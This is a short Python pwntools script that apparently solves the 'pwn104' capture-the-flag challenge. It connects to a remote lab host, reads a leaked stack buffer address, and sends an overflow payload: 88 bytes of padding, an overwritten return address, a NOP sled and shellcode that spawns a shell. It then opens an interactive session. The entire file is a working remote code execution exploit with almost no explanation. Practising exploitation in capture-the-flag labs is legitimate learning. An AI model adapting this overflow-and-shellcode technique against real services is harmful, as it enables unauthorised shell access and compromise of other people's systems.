from pwn import *
from struct import *
import sys

context(os="linux", arch="amd64")
p = remote("10.10.113.69", 9004)
exe = ELF("./pwn104-1644300377109.pwn104")
context.binary = exe

p.recvuntil(b"I'm waiting for you at ")
buf_addr = int(
    p.recvline(timeout=2).strip().split()[0], 16
)  # turn address we get into int for p64
log.info("consumed line: %r" % buf_addr)

shellcode = asm(shellcraft.sh())
jmp_addr = p64(buf_addr + 96 + 16)  # adress + offset + 8 rip byte +  nop/2
payload = b"A" * 88
payload += jmp_addr
payload += b"\x90" * 32  # nop
payload += shellcode


p.sendline(payload)  # Send payload
p.interactive()
